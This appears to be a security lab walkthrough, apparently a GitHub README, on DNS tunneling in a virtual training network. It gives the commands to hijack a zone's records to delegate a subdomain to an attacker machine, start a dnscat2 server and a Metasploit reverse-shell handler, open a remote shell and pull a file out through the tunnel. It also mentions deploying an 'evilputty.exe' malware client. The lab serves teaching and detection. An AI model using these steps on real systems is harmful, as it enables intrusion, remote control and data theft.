# DNS-Tunneling


# Set Up the Attack
When using DNS tunneling, the attacker must be able to act as an authoritative name server so that queries for name records are directed to his or her machine. Modern techniques use domain generation algorithms (DGA) to cycle rapidly through ephemerally-created domains. Our approach will be to compromise the records on another name server (hosted on LAMP) to create a delegation for a subdomain. Our attacking machine (PT1) will be the name server for this subdomain. To simplify things, we'll assume the compromise takes the form of having discovered the administrative credentials for LAMP.


![image](https://github.com/itzyezz/DNS-Tunneling/assets/105263523/5d060a5c-fa65-438e-a98a-cbaa995ce2a5)

This step is necessary because for technical reasons we cannot use the DNS server running on DC1 as a resolver. We have to query the 515web.net server directly and have it resolve our queries for us. Note that this is an unsecure configuration for an authoritative name server.
![image](https://github.com/itzyezz/DNS-Tunneling/assets/105263523/c440c7c9-c5f6-472f-8926-49e80cd5526a)

Run the following command to open the DNS records for the 515web.net domain: **sudo nano db.515web.net**

![image](https://github.com/itzyezz/DNS-Tunneling/assets/105263523/68b4925a-2a0a-4fad-ac21-0ad40d7ab658)

Add the following records to the end of the file to delegate the records for a subdomain (pwn.515web.net) to the IP address 192.168.2.192, which is the attack machine (PT1). Be careful to add the period at the end of the domain names:

**$ORIGIN pwn.515web.net.**

**@   IN   NS   ns1.pwn.515web.net.**

**ns1  IN    A   192.168.2.192**

![image](https://github.com/itzyezz/DNS-Tunneling/assets/105263523/470df8b8-f6ac-430c-b583-bdcb3105bbfc)

Restart the server: **sudo service bind9 restart**


Lab topology—LAMP hosts DNS records for 515web.net, which have been corrupted to forward queries for a subdomain to PT1. The vLOCAL network is screened by the UTM1 router/firewall VM.

![image](https://github.com/itzyezz/DNS-Tunneling/assets/105263523/e5649673-5006-4adc-a8ca-9eb5153749de)


# Set Up a Listener

On the attacking machine, we need to set up a server to listen for connection attempts, arriving as requests for records in the pwn.515web.net domain. We will use the dnscat2 tunneling tool, developed by Ron Bowes (github.com/iagox86/dnscat2/blob/master/README.md).


 Run the following commands:

**service apache2 start**

**cd ../Downloads/dnscat2/server**

**ruby ./dnscat2.rb pwn.515web.net**

(We also need to send the client to the victim machine. We'll use our familiar evilputty.exe malware to achieve this.)


![image](https://github.com/itzyezz/DNS-Tunneling/assets/105263523/5b5dc588-3619-449c-ab9a-d675a3a97adc)

Open a second terminal and run msfconsole


![image](https://github.com/itzyezz/DNS-Tunneling/assets/105263523/542cac3d-28ea-4049-8e90-d47800be494a)


At the msf5 prompt, run the following commands to start the listener for the reverse shell:

**use exploit/multi/handler**

**set payload windows/meterpreter/reverse_tcp**

**set lhost 192.168.2.192**

**set lport 3389**

**exploit**

![image](https://github.com/itzyezz/DNS-Tunneling/assets/105263523/b3a023c0-d7fa-469c-ae02-8a4ad142c92c)


# Trigger the Attack

To view the progress of the attack, we'll run a Wireshark capture on just the right ports (call it inspired foresight).

Logged into a PC VM using credentials of  **bobby**

![image](https://github.com/itzyezz/DNS-Tunneling/assets/105263523/4fcbb285-d2bf-43c4-8899-e31481d90523)

Start a Wireshark capture on the Ethernet interface with the following filter:

**host not 10.1.0.1 and (port 3389 or port 53)**

![image](https://github.com/itzyezz/DNS-Tunneling/assets/105263523/4f967f86-7f3b-4acd-9b72-981a47fcf188)



![image](https://github.com/itzyezz/DNS-Tunneling/assets/105263523/0079bb65-658b-41c7-8b68-5f5dc1453c05)


![image](https://github.com/itzyezz/DNS-Tunneling/assets/105263523/c87e0204-145d-4984-bc96-fb58845c7498)


Switch to the terminal hosting dnscat2 and verify that a new window (1) has been created. You can ignore the Ruby errors. Note that the session is encrypted.

![image](https://github.com/itzyezz/DNS-Tunneling/assets/105263523/226c9f13-4bea-4a79-bd27-d6a236062ba2)


Let's imagine that the attacker has switched access methods, leaving the DNS backdoor running.
<br>

Switch to the terminal hosting dnscat2 and run the following commands to navigate the local system:

**window --i=1**

**shell**

**window --i=2**

**dir**

![image](https://github.com/itzyezz/DNS-Tunneling/assets/105263523/79160d47-0f34-46f7-a017-0ac3a947ba39)

![image](https://github.com/itzyezz/DNS-Tunneling/assets/105263523/a070985b-c1df-4f12-af75-fbdac9b59b54)


Let's say that the GPO zip file is of interest. We can use the DNS tunnel to download it. Run the following commands to close the local shell, reconnect to the original prompt, and run the download command:

**exit**

**window --i=1**

**download gpo.zip /root/Downloads/gpo.zip**

![image](https://github.com/itzyezz/DNS-Tunneling/assets/105263523/07082657-6cb8-449c-8e00-c488480dce1e)


Switch to PC1. Stop the Wireshark capture and scroll to the start of the output.

Observe the Meterpreter session established over port 3389. This is the common port for Microsoft's Remote Desktop Protocol (RDP), but the data transfer here is using raw TCP packets.

![image](https://github.com/itzyezz/DNS-Tunneling/assets/105263523/cbffe2ee-a4f0-4437-a28a-29486b263bc7)

Scroll toward the end of the capture to observe the DNS tunneling traffic. Note that a variety of record types are used.

While this technique can circumvent many firewall configurations, it is distinctively noisy and simple for IDS to detect.

![image](https://github.com/itzyezz/DNS-Tunneling/assets/105263523/f31869fc-a538-4a26-bc09-53b30f01b94a)

